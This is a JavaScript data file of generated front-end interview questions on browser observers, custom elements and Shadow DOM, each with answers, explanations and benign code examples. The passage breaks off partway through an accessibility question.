// scripts/dom-gen/part5.cjs
// 75 High-Value, Unique DOM Interview Questions
// Distribution: 10 EASY, 40 INTERMEDIATE, 25 DIFFICULT

module.exports = [
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "IntersectionObserver Definition & Purpose",
    "difficulty": "EASY",
    "questionType": "CONCEPTUAL",
    "question": "What is the IntersectionObserver API and why is it superior to scroll event listeners for lazy loading?",
    "shortAnswer": "IntersectionObserver asynchronously observes when a target element enters or exits the visible viewport or a specified container, executing off the main thread without scroll listener lag or layout thrashing.",
    "detailedExplanation": "- **Off Main Thread**: Browser calculates visibility intersections asynchronously during its internal rendering pipeline.\n- **No Event Flooding**: Unlike `window.addEventListener('scroll')`, it does not fire dozens of times per second or require debounce/throttle wrappers.\n- **Zero getBoundingClientRect**: Eliminates forced synchronous layouts caused by reading coordinates during scroll.",
    "codeExample": "const observer = new IntersectionObserver((entries) => {\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      console.log('Element is now visible in viewport!');\n    }\n  });\n});\n\nobserver.observe(document.querySelector('#lazy-image'));",
    "interviewTips": [
      "Cite eliminating `getBoundingClientRect()` inside scroll listeners as the primary performance win of IntersectionObserver."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "ResizeObserver Purpose",
    "difficulty": "EASY",
    "questionType": "CONCEPTUAL",
    "question": "What is ResizeObserver and how does it differ from window.onresize?",
    "shortAnswer": "ResizeObserver monitors dimension changes on individual DOM elements, whereas `window.onresize` only fires when the entire browser window is resized.",
    "detailedExplanation": "- **Component-Level Observability**: Essential for responsive components (like sidebars collapsing, tabs wrapping, or charts resizing) that resize independent of window width.\n- **Zero Polling**: Replaces costly `setInterval` layout polling loops.\n- **Direct Dimensions**: Exposes `contentRect`, `borderBoxSize`, and `contentBoxSize` directly in the callback.",
    "codeExample": "const chartContainer = document.querySelector('#chart');\n\nconst resizeObserver = new ResizeObserver((entries) => {\n  for (const entry of entries) {\n    const { width, height } = entry.contentRect;\n    redrawChart(width, height);\n  }\n});\n\nresizeObserver.observe(chartContainer);",
    "interviewTips": [
      "Clarify that `window.onresize` misses element dimension changes triggered by CSS transitions, collapsible sidebars, or DOM insertions."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "Disconnecting Observers to Prevent Memory Leaks",
    "difficulty": "EASY",
    "questionType": "CODE",
    "question": "How do you stop an observer from watching elements when they are unmounted or no longer needed?",
    "shortAnswer": "Call `observer.unobserve(targetElement)` to stop watching a single element, or `observer.disconnect()` to stop watching all observed elements and release memory.",
    "detailedExplanation": "- **observer.unobserve(target)**: Selectively stops watching a specific DOM node.\n- **observer.disconnect()**: Completely shuts down the observer, clearing all internal references.\n- **SPA Cleanups**: Mandatory in `useEffect` or component destroy hooks to avoid memory leaks from detached elements.",
    "codeExample": "const observer = new IntersectionObserver(callback);\nobserver.observe(img1);\nobserver.observe(img2);\n\n// Stop observing only img1:\nobserver.unobserve(img1);\n\n// Stop observing everything and tear down observer:\nobserver.disconnect();",
    "interviewTips": [
      "Always mention `observer.disconnect()` as a critical cleanup step during single-page app component teardowns."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Custom Elements customElements.define",
    "difficulty": "EASY",
    "questionType": "CODE",
    "question": "How do you define and register a custom HTML tag using the Custom Elements API?",
    "shortAnswer": "Create a class extending `HTMLElement` and register it with `customElements.define('my-tag', MyTagClass)`.",
    "detailedExplanation": "- **Hyphen Requirement**: Custom element tag names MUST contain at least one hyphen (e.g. `<user-card>`, `<app-header>`) to avoid naming collisions with future standard HTML tags.\n- **Extends HTMLElement**: Autonomous custom elements must inherit from `HTMLElement`.\n- **Constructor Requirement**: The constructor must call `super()` first.",
    "codeExample": "class AppHeader extends HTMLElement {\n  constructor() {\n    super();\n    this.innerHTML = '<h1>My Awesome Application</h1>';\n  }\n}\n\n// Must contain a hyphen:\ncustomElements.define('app-header', AppHeader);",
    "interviewTips": [
      "Highlight the hyphen rule: browsers reject tag names without hyphens to preserve HTML namespace compatibility."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Shadow Root Open vs Closed Mode",
    "difficulty": "EASY",
    "questionType": "COMPARISON",
    "question": "What is the difference between element.attachShadow({ mode: 'open' }) and { mode: 'closed' }?",
    "shortAnswer": "`mode: 'open'` allows outer JavaScript to inspect the shadow tree via `element.shadowRoot`, while `mode: 'closed'` hides the shadow root, making `element.shadowRoot` return `null`.",
    "detailedExplanation": "- **open Mode**: `element.shadowRoot` returns the ShadowRoot instance. This is the community standard for testability and developer ergonomics.\n- **closed Mode**: `element.shadowRoot` returns `null`. JavaScript outside the class cannot access the shadow tree directly.\n- **Security Myth**: Closed mode does NOT provide real cryptographic security; outer code can still monkey-patch `Element.prototype.attachShadow`.",
    "codeExample": "class MyWidget extends HTMLElement {\n  constructor() {\n    super();\n    // Open mode (recommended):\n    this.attachShadow({ mode: 'open' });\n    this.shadowRoot.innerHTML = '<p>Encapsulated widget</p>';\n  }\n}\ncustomElements.define('my-widget', MyWidget);\n\nconst widget = document.querySelector('my-widget');\nconsole.log(widget.shadowRoot); // ShadowRoot object (accessible)",
    "interviewTips": [
      "State clearly that `mode: 'closed'` is almost never recommended because it breaks testing tools and provides false security."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "IntersectionObserver Options (root, rootMargin, threshold)",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What are root, rootMargin, and threshold options in the IntersectionObserver constructor?",
    "shortAnswer": "`root` specifies the scrolling viewport container (default is browser viewport); `rootMargin` expands or shrinks the intersection bounding box; `threshold` defines what percentage of visibility triggers the callback.",
    "detailedExplanation": "- **root**: A specific ancestor element whose bounds act as the viewport. Must be an ancestor of target.\n- **rootMargin**: CSS-style margin (e.g. `'200px 0px'`) used to pre-load images 200px before they become visible on screen.\n- **threshold**: Single number (`0.5`) or array (`[0, 0.25, 0.5, 0.75, 1.0]`) indicating at what visibility percentages to fire.",
    "codeExample": "const observer = new IntersectionObserver((entries) => {\n  // Pre-loads images 200px BEFORE entering viewport:\n  entries.forEach(entry => {\n    if (entry.isIntersecting) {\n      entry.target.src = entry.target.dataset.src;\n      observer.unobserve(entry.target);\n    }\n  });\n}, {\n  root: null, // browser viewport\n  rootMargin: '200px 0px', // 200px pre-fetch buffer\n  threshold: 0.1 // triggers when 10% visible\n});",
    "interviewTips": [
      "Use the '200px rootMargin pre-fetch' pattern to explain how seamless infinite scroll and image loading work."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "MutationObserver Configuration Options",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What mutation types can MutationObserver track and what are the key options in MutationObserverInit?",
    "shortAnswer": "MutationObserver tracks DOM changes via options: `childList` (added/removed nodes), `attributes` (attribute changes), `characterData` (text content changes), `subtree` (watch all descendants), and `attributeOldValue`.",
    "detailedExplanation": "- **childList**: Notifies when child elements or text nodes are inserted or removed.\n- **attributes**: Notifies when attributes like `class` or `disabled` change. Can filter with `attributeFilter: ['class', 'data-state']`.\n- **characterData**: Notifies when text inside text nodes changes.\n- **subtree**: Must be `true` if you want to observe descendants beyond direct children.\n- **Asynchronous Batching**: Mutations are batched and delivered as microtasks.",
    "codeExample": "const observer = new MutationObserver((mutations) => {\n  for (const m of mutations) {\n    if (m.type === 'childList') console.log('Nodes added/removed');\n    if (m.type === 'attributes') console.log(`Attribute ${m.attributeName} changed`);\n  }\n});\n\nobserver.observe(document.body, {\n  childList: true,\n  subtree: true,\n  attributes: true,\n  attributeFilter: ['data-theme']\n});",
    "interviewTips": [
      "Highlight `attributeFilter` as an essential performance practice to prevent handling irrelevant attribute mutations."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "MutationObserver vs Deprecated Mutation Events",
    "difficulty": "INTERMEDIATE",
    "questionType": "COMPARISON",
    "question": "Why were legacy Mutation Events (DOMSubtreeModified, DOMNodeInserted) deprecated and replaced by MutationObserver?",
    "shortAnswer": "Mutation Events fired synchronously on every single node mutation, severely degrading browser performance, causing layout thrashing, and triggering recursive infinite loops. MutationObserver batches changes asynchronously.",
    "detailedExplanation": "- **Synchronous Penalty**: Removing 1,000 nodes fired 1,000 synchronous event dispatches on the main thread.\n- **Browser Removal**: Chrome, Firefox, and Safari have completely deprecated and removed Mutation Events in 2024.\n- **Batch Delivery**: MutationObserver delivers a list of `MutationRecord` objects asynchronously via microtasks, keeping UI fluid.",
    "codeExample": "// OBSOLETE & REMOVED (Do not use):\n// document.addEventListener('DOMNodeInserted', handleNode);\n\n// MODERN STANDARD (Asynchronous & batched):\nconst observer = new MutationObserver(records => handleMutations(records));\nobserver.observe(container, { childList: true });",
    "interviewTips": [
      "Emphasize that Mutation Events were synchronous and caused catastrophic slowdowns, while MutationObserver is asynchronous and batched."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Custom Element Lifecycle Callbacks",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What are the four primary lifecycle callbacks of an autonomous Custom Element?",
    "shortAnswer": "1. `connectedCallback`: Element inserted into document DOM. 2. `disconnectedCallback`: Element removed from DOM. 3. `adoptedCallback`: Element moved to a new document. 4. `attributeChangedCallback`: Observed attribute mutated.",
    "detailedExplanation": "- **connectedCallback**: Set up event listeners, fetch data, render initial DOM.\n- **disconnectedCallback**: Teardown timers, unbind global event listeners, disconnect observers.\n- **attributeChangedCallback**: Responds to attribute changes. Requires static `observedAttributes` getter.\n- **adoptedCallback**: Rare; triggers when `document.adoptNode()` moves element across iframes.",
    "codeExample": "class UserBadge extends HTMLElement {\n  static get observedAttributes() { return ['status']; }\n  \n  connectedCallback() {\n    console.log('Element attached to document DOM');\n  }\n  disconnectedCallback() {\n    console.log('Element removed from document DOM');\n  }\n  attributeChangedCallback(name, oldVal, newVal) {\n    console.log(`Attribute ${name} changed from ${oldVal} to ${newVal}`);\n  }\n}",
    "interviewTips": [
      "List all four callbacks: `connectedCallback`, `disconnectedCallback`, `adoptedCallback`, `attributeChangedCallback`."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Custom Elements observedAttributes and attributeChangedCallback",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you monitor and react to attribute changes in a custom Web Component?",
    "shortAnswer": "Define a static getter `static get observedAttributes() { return ['attr1']; }` and implement `attributeChangedCallback(name, oldValue, newValue)`.",
    "detailedExplanation": "- **Opt-in Performance**: Browsers only trigger the callback for attributes explicitly declared in `observedAttributes`.\n- **Initial Call**: `attributeChangedCallback` runs on initial element construction if attributes are present in markup.\n- **Attribute-Property Sync**: Best practice is to reflect property changes to attributes and vice versa.",
    "codeExample": "class CounterTag extends HTMLElement {\n  static get observedAttributes() { return ['count']; }\n\n  attributeChangedCallback(name, oldVal, newVal) {\n    if (name === 'count' && oldVal !== newVal) {\n      this.textContent = `Current Count: ${newVal}`;\n    }\n  }\n}\ncustomElements.define('counter-tag', CounterTag);",
    "interviewTips": [
      "Always emphasize that without the `static get observedAttributes()` getter, `attributeChangedCallback` will never fire."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "HTML <slot> and Named Slots",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What is an HTML <slot> element and how do named slots work in Shadow DOM?",
    "shortAnswer": "A `<slot>` is a placeholder inside a Shadow DOM where markup from the light DOM is projected and rendered, supporting default (unnamed) slots and named slots (`<slot name=\"header\">`).",
    "detailedExplanation": "- **Composition**: Enables component templating while allowing users to inject custom content.\n- **Named Slots**: Matches light DOM children using `slot=\"slotName\"` attribute: `<h1 slot=\"header\">`.\n- **Fallback Content**: Content placed inside `<slot>Default text</slot>` displays when no child is projected.",
    "codeExample": "// Shadow DOM Template:\nthis.shadowRoot.innerHTML = `\n  <header><slot name=\"title\">Default Title</slot></header>\n  <main><slot></slot></main>\n`;\n\n// Usage in HTML:\n// <my-card><span slot=\"title\">Custom Title</span><p>Body content</p></my-card>",
    "interviewTips": [
      "Explain slot projection: light DOM nodes are visually rendered in the slot without physically moving in the DOM tree."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "CSS Scoping with :host and :host()",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "How do the CSS :host and :host(selector) pseudo-classes style custom Web Components?",
    "shortAnswer": "`:host` styles the custom element container from inside its own shadow DOM; `:host(selector)` applies styles only when the host matches a specific class or attribute state.",
    "detailedExplanation": "- **Encapsulated Host Styling**: Directly targets the outer custom tag (e.g. `<my-button>`) from the inner shadow stylesheet.\n- **State Matching**: `:host(.active)`, `:host([disabled])`, or `:host(:hover)` allows styling based on host attributes.\n- **Default Display**: Custom elements are `display: inline` by default; `:host { display: block; }` is standard practice.",
    "codeExample": ":host {\n  display: block;\n  padding: 1rem;\n  border-radius: 8px;\n  background: #f8fafc;\n}\n\n:host([disabled]) {\n  opacity: 0.5;\n  pointer-events: none;\n}",
    "interviewTips": [
      "Remember that custom elements default to `display: inline`; using `:host { display: block; }` is almost always needed."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "CSS ::slotted() Pseudo-Element",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "What is the CSS ::slotted() pseudo-element and what styling limitations does it have?",
    "shortAnswer": "`::slotted(selector)` styles elements projected into a `<slot>` from inside the shadow DOM, but it can only target top-level slotted elements, not their nested descendants.",
    "detailedExplanation": "- **Direct Children Only**: `::slotted(p)` works for direct slotted `<p>` tags; `::slotted(p span)` is invalid and ignored by browsers.\n- **Specificity**: Outer document styles always override `::slotted()` styles.\n- **Compound Selectors**: Must use compound single element selectors like `::slotted(.highlight)`.",
    "codeExample": "/* Inside Shadow DOM styles: */\n::slotted(h2) {\n  color: #2563eb;\n  margin-top: 0;\n}\n\n/* FAILS (Cannot style nested descendants of slotted elements): */\n/* ::slotted(div) span { color: red; } */",
    "interviewTips": [
      "Point out the single-level limitation: `::slotted()` cannot reach into nested descendants of slotted nodes."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "CSS ::part() and CSS Shadow Parts",
    "difficulty": "INTERMEDIATE",
    "questionType": "CONCEPTUAL",
    "question": "How does the CSS part attribute and ::part() selector enable theme styling of shadow DOM internals?",
    "shortAnswer": "An element inside a shadow DOM exposes a styling hook using `part=\"part-name\"`, allowing external page stylesheets to style it safely using `my-element::part(part-name)` without piercing encapsulation.",
    "detailedExplanation": "- **Controlled Theming**: Exposes specific internal elements for external styling without leaking the entire shadow tree.\n- **No Arbitrary Selectors**: Outer CSS cannot style elements lacking a `part` attribute.\n- **Design Systems**: Standardized method for theming third-party Web Component libraries.",
    "codeExample": "// Inside Shadow DOM:\n// <button part=\"action-btn\">Click Me</button>\n\n/* In global page CSS (styles internal button safely): */\nmy-dialog::part(action-btn) {\n  background-color: #6366f1;\n  border-radius: 9999px;\n}",
    "interviewTips": [
      "Mention `::part()` as the official CSS specification replacement for the deprecated `/deep/` and `::shadow` combinators."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "slotchange Event",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you detect when child nodes assigned to a <slot> are added, removed, or changed?",
    "shortAnswer": "Listen for the `slotchange` event on the `<slot>` element, then inspect assigned nodes using `slot.assignedNodes()` or `slot.assignedElements()`.",
    "detailedExplanation": "- **Event Target**: Fires directly on the `<slot>` element when its assigned content changes.\n- **assignedElements()**: Returns an array of element nodes assigned to the slot (skipping text/whitespace nodes).\n- **Use Case**: Automatically recalculating tab counts or carousel slide counts when users inject new children into a component.",
    "codeExample": "const slot = this.shadowRoot.querySelector('slot');\n\nslot.addEventListener('slotchange', () => {\n  const assignedElements = slot.assignedElements();\n  console.log(`Slot content updated! Total elements: ${assignedElements.length}`);\n  updateSlideIndicators(assignedElements.length);\n});",
    "interviewTips": [
      "Use `slot.assignedElements()` to easily filter out empty whitespace text nodes from assigned children."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "ResizeObserver borderBoxSize vs contentBoxSize",
    "difficulty": "INTERMEDIATE",
    "questionType": "COMPARISON",
    "question": "What is the difference between borderBoxSize, contentBoxSize, and contentRect in a ResizeObserverEntry?",
    "shortAnswer": "`contentRect` is a legacy DOMRectReadOnly; `borderBoxSize` provides the dimension including padding and border; `contentBoxSize` provides the dimension of content only. Both box sizes return arrays for CSS fragmentation.",
    "detailedExplanation": "- **contentRect**: Left/top are padding offsets; width/height represent content box.\n- **borderBoxSize**: Preferred for canvas and chart wrappers to match the actual visual border-box size.\n- **devicePixelContentBoxSize**: Modern addition reporting size in physical device pixels, eliminating blurry lines on high-DPI canvas screens.",
    "codeExample": "const observer = new ResizeObserver(([entry]) => {\n  if (entry.borderBoxSize) {\n    const { inlineSize, blockSize } = entry.borderBoxSize[0];\n    console.log(`Border box: ${inlineSize}px wide, ${blockSize}px high`);\n  }\n});\nobserver.observe(canvasWrapper);",
    "interviewTips": [
      "Mention that `inlineSize` and `blockSize` are logical dimensions (horizontal writing mode: inlineSize = width, blockSize = height)."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "PerformanceObserver for Web Vitals",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you use PerformanceObserver to measure Largest Contentful Paint (LCP) in the DOM?",
    "shortAnswer": "Create a `new PerformanceObserver()` observing `'largest-contentful-paint'` entries with `{ buffered: true }`.",
    "detailedExplanation": "- **buffered: true**: Retrieves entries that occurred prior to observer initialization during page load.\n- **entry.element**: Points directly to the DOM element (hero image, heading) that triggered the LCP event.\n- **Core Web Vitals**: Standard method for tracking real-user performance metrics in production monitoring.",
    "codeExample": "const lcpObserver = new PerformanceObserver((entryList) => {\n  const entries = entryList.getEntries();\n  const lastEntry = entries[entries.length - 1];\n  console.log('LCP Render Time (ms):', lastEntry.renderTime || lastEntry.loadTime);\n  console.log('LCP DOM Element:', lastEntry.element);\n});\n\nlcpObserver.observe({ type: 'largest-contentful-paint', buffered: true });",
    "interviewTips": [
      "Always include `{ buffered: true }` when observing performance entries so you don't miss events from early page load."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Custom Elements customElements.whenDefined()",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you wait for a custom element tag to be registered before interacting with its methods?",
    "shortAnswer": "Call `customElements.whenDefined('my-tag')`, which returns a Promise that resolves when the tag has been registered.",
    "detailedExplanation": "- **Async Loading**: Custom element scripts are often bundled in separate asynchronous chunks.\n- **Prevents Undefined Errors**: Awaiting `whenDefined` guarantees that calling custom methods on the element will not throw `TypeError: el.someMethod is not a function`.\n- **CSS :defined**: Pairs with the CSS `:not(:defined)` pseudo-class to hide elements until registered.",
    "codeExample": "async function initializeDashboard() {\n  // Waits until <user-profile> script is loaded and defined:\n  await customElements.whenDefined('user-profile');\n  \n  const profile = document.querySelector('user-profile');\n  profile.loadUserData(42);\n}",
    "interviewTips": [
      "Combine `customElements.whenDefined` with CSS `:not(:defined) { display: none; }` to eliminate FOUC (flash of unstyled content)."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "CSS :defined Pseudo-Class and FOUC Prevention",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you prevent a Flash of Unstyled Content (FOUC) while custom elements are downloading?",
    "shortAnswer": "Use the `:not(:defined)` CSS selector to hide or show placeholders on custom elements until `customElements.define()` executes.",
    "detailedExplanation": "- **Native Browser State**: Any element matching an unregistered custom tag matches `:not(:defined)`.\n- **Instant Upgrade**: Once `customElements.define()` is called, the element matches `:defined` and browser styles update automatically.\n- **Skeleton UI**: You can render skeleton animations on `:not(:defined)` elements.",
    "codeExample": "/* Hides custom elements until their JavaScript definition loads: */\ncustom-carousel:not(:defined) {\n  opacity: 0;\n  min-height: 300px;\n  background: #f1f5f9; /* Skeleton placeholder */\n}\n\ncustom-carousel:defined {\n  opacity: 1;\n  transition: opacity 0.3s ease-in;\n}",
    "interviewTips": [
      "Mention `:not(:defined)` as the standard web platform pattern for preventing FOUC with Web Components."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "IntersectionObserver Threshold Array",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you track granular scroll progress of an article using an IntersectionObserver threshold array?",
    "shortAnswer": "Pass an array of numbers between 0.0 and 1.0 (e.g. `[0, 0.25, 0.5, 0.75, 1.0]`) to `options.threshold` to receive updates at each milestone.",
    "detailedExplanation": "- **Multi-Threshold**: Fires every time the target's visibility crosses any value in the threshold array.\n- **Reading Ratio**: Inspect `entry.intersectionRatio` to determine the current percentage visible.\n- **Progress Bars**: Used to drive reading progress bars or video playback volume as users scroll through articles.",
    "codeExample": "const observer = new IntersectionObserver((entries) => {\n  for (const entry of entries) {\n    const pct = Math.round(entry.intersectionRatio * 100);\n    console.log(`Article is ${pct}% visible`);\n  }\n}, {\n  threshold: [0, 0.25, 0.5, 0.75, 1.0] // Triggers at 0%, 25%, 50%, 75%, 100%\n});",
    "interviewTips": [
      "Explain that passing an array to `threshold` enables multi-step scroll progress tracking without scroll listeners."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "ResizeObserver Loop Limit Exceeded Error",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "What causes the 'ResizeObserver loop limit exceeded' error in browser consoles and how do you resolve it?",
    "shortAnswer": "It occurs when a ResizeObserver callback resizes an observed element, triggering another resize notification in the same animation frame, threatening an infinite loop.",
    "detailedExplanation": "- **Depth Safeguard**: The browser monitors the depth of elements being resized; if a deeper element modifies a shallower ancestor in the same frame, the browser defers delivery and logs this warning.\n- **Harmless Notification**: In most cases, it is a benign notification indicating that a delivery was deferred to the next frame.\n- **Resolution**: Avoid modifying elements that change the dimensions of observed containers inside the callback, or defer updates with `requestAnimationFrame()`.",
    "codeExample": "// Pattern to prevent loop limit exceeded:\nconst observer = new ResizeObserver((entries) => {\n  window.requestAnimationFrame(() => {\n    // Defer layout updates to the next frame:\n    updateComponentDimensions(entries[0].contentRect);\n  });\n});",
    "interviewTips": [
      "Clarify that 'ResizeObserver loop limit exceeded' is a safeguard warning, and deferring layout mutations with rAF resolves it."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Customized Built-In Elements (is Attribute)",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "What is the difference between an Autonomous Custom Element and a Customized Built-In Element?",
    "shortAnswer": "Autonomous elements inherit from `HTMLElement` and use custom tags (`<my-button>`), while Customized Built-In elements inherit from specific HTML classes (like `HTMLButtonElement`) and use the `is` attribute (`<button is=\"my-button\">`).",
    "detailedExplanation": "- **Built-In Accessibility**: Customized built-in elements retain native semantics, keyboard interactions, and accessibility of the original tag.\n- **Registration Syntax**: `customElements.define('my-btn', MyBtn, { extends: 'button' })`.\n- **Safari Limitation**: Apple Safari has famously refused to implement customized built-in elements, making autonomous custom elements the cross-browser standard.",
    "codeExample": "class ConfirmButton extends HTMLButtonElement {\n  connectedCallback() {\n    this.addEventListener('click', (e) => {\n      if (!confirm('Are you sure?')) e.preventDefault();\n    });\n  }\n}\n// Registering customized built-in:\ncustomElements.define('confirm-button', ConfirmButton, { extends: 'button' });\n\n// Usage in HTML:\n// <button is=\"confirm-button\">Delete Account</button>",
    "interviewTips": [
      "Mention Safari's lack of support for customized built-in elements (`is=\"...\"`) to demonstrate deep platform knowledge."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Form-Associated Custom Elements Lifecycle",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "What lifecycle callbacks are unique to Form-Associated Custom Elements (FACE)?",
    "shortAnswer": "`formAssociatedCallback(form)`, `formDisabledCallback(disabled)`, `formResetCallback()`, and `formStateRestoreCallback(state, mode)`.",
    "detailedExplanation": "- **formAssociatedCallback(form)**: Called when the element is associated with or disassociated from a `<form>`.\n- **formDisabledCallback(disabled)**: Called when the parent `<fieldset disabled>` is toggled.\n- **formResetCallback()**: Called when the parent form is reset, allowing custom inputs to revert to default values.\n- **formStateRestoreCallback()**: Called by the browser to restore input state after history navigation or form autofill.",
    "codeExample": "class CustomToggle extends HTMLElement {\n  static formAssociated = true;\n  constructor() {\n    super();\n    this.internals = this.attachInternals();\n  }\n  formResetCallback() {\n    this.checked = false; // Reset custom control state\n    this.internals.setFormValue('off');\n  }\n}",
    "interviewTips": [
      "Listing FACE lifecycle callbacks (`formResetCallback`, `formDisabledCallback`) proves advanced Web Components mastery."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "MutationObserver Microtask Delivery Semantics",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "When exactly do MutationObserver callbacks execute relative to JavaScript code execution and screen rendering?",
    "shortAnswer": "MutationObserver callbacks execute as microtasks immediately when the current JavaScript call stack empties, before the browser renders the next frame and before macrotasks (like setTimeout) run.",
    "detailedExplanation": "- **Microtask Priority**: Queued in the microtask checkpoint alongside `Promise.then()` callbacks.\n- **Pre-Render Execution**: Executes before browser style recalculations and layout paints, allowing scripts to adjust the DOM before pixels hit the screen.\n- **takeRecords()**: Calling `observer.takeRecords()` synchronously drains and returns any pending mutation records immediately.",
    "codeExample": "const observer = new MutationObserver(() => console.log('Mutation microtask'));\nobserver.observe(document.body, { childList: true });\n\nsetTimeout(() => console.log('Macrotask (setTimeout)'), 0);\nPromise.resolve().then(() => console.log('Promise microtask'));\n\ndocument.body.appendChild(document.createElement('div'));\nconsole.log('Call stack complete');\n\n// Output order:\n// 1. Call stack complete\n// 2. Promise microtask\n// 3. Mutation microtask\n// 4. Macrotask (setTimeout)",
    "interviewTips": [
      "Clarify that MutationObservers run as microtasks before rendering, meaning visual changes can be corrected before users see them."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Declarative Shadow DOM (<template shadowrootmode>)",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "What is Declarative Shadow DOM (DSD) and how does it enable Server-Side Rendering (SSR) for Web Components?",
    "shortAnswer": "Declarative Shadow DOM allows attaching shadow roots directly in HTML markup using `<template shadowrootmode=\"open\">`, enabling server-rendered HTML to display encapsulated Shadow DOM without waiting for JavaScript.",
    "detailedExplanation": "- **SSR Support**: Solves the historic limitation that Web Components required client-side JS `attachShadow()` to render shadow trees.\n- **Zero JS Initial Render**: Browsers parse and instantiate the shadow root immediately during initial HTML parsing.\n- **Cross-Browser Standard**: Standardized in HTML specifications and implemented across all evergreen browsers.",
    "codeExample": "<!-- Server-Rendered HTML with Declarative Shadow DOM: -->\n<user-card>\n  <template shadowrootmode=\"open\">\n    <style>p { color: #10b981; font-weight: bold; }</style>\n    <p>Server-rendered encapsulated user card!</p>\n  </template>\n</user-card>",
    "interviewTips": [
      "Highlight Declarative Shadow DOM (`<template shadowrootmode=\"open\">`) as the breakthrough that made SSR Web Components viable."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "CSS Cascading Inside vs Outside Shadow DOM",
    "difficulty": "DIFFICULT",
    "questionType": "CONCEPTUAL",
    "question": "How do inherited CSS properties (like color and font-family) interact with Shadow DOM boundaries?",
    "shortAnswer": "Inherited CSS properties (such as color, font-family, line-height) naturally pierce through shadow boundaries and inherit from the host element, whereas non-inherited properties (background, border, padding) do not.",
    "detailedExplanation": "- **Natural Inheritance**: Text styles set on `body` (e.g. `font-family: Inter`) cascade into shadow roots automatically.\n- **CSS Variables**: CSS Custom Properties (`--my-theme-color`) also cascade seamlessly into shadow trees.\n- **Resetting Styles**: To prevent outer inherited styles from bleeding in, use `:host { all: initial; }` inside the shadow stylesheet.",
    "codeExample": "/* Inside Shadow DOM styles to isolate from outer typography leaks: */\n:host {\n  all: initial; /* Resets all inherited CSS properties to defaults */\n  display: block;\n  font-family: system-ui, sans-serif;\n}",
    "interviewTips": [
      "Explain how CSS variables and inherited properties pierce shadow boundaries, while `:host { all: initial; }` blocks them."
    ]
  },
  {
    "topic": "Observers (Mutation, Intersection, Resize)",
    "subtopic": "MutationObserver takeRecords() Method",
    "difficulty": "DIFFICULT",
    "questionType": "CODE",
    "question": "What does observer.takeRecords() do in MutationObserver and when must it be called before disconnect()?",
    "shortAnswer": "`observer.takeRecords()` synchronously empties the observer's internal queue and returns any pending `MutationRecord` objects before the asynchronous callback has fired.",
    "detailedExplanation": "- **Immediate Flush**: Drains mutations that occurred but haven't been dispatched to the callback yet.\n- **Teardown Trap**: Calling `observer.disconnect()` immediately discards pending mutations in the queue.\n- **Safe Teardown Pattern**: Call `const pending = observer.takeRecords(); process(pending); observer.disconnect();` to ensure no changes are lost.",
    "codeExample": "const observer = new MutationObserver(handleMutations);\nobserver.observe(container, { childList: true });\n\nfunction teardown() {\n  // Drains and processes any unhandled mutations before disconnecting:\n  const pendingMutations = observer.takeRecords();\n  if (pendingMutations.length > 0) {\n    handleMutations(pendingMutations);\n  }\n  observer.disconnect();\n}",
    "interviewTips": [
      "Mention that `disconnect()` discards pending records unless you retrieve them first with `takeRecords()`."
    ]
  },
  {
    "topic": "Shadow DOM & Web Components",
    "subtopic": "Shadow DOM and Accessibility (ARIA ID references across roots)",
    "difficulty": "DIFFICULT",
    "questionType": "ACCESSIBILITY",
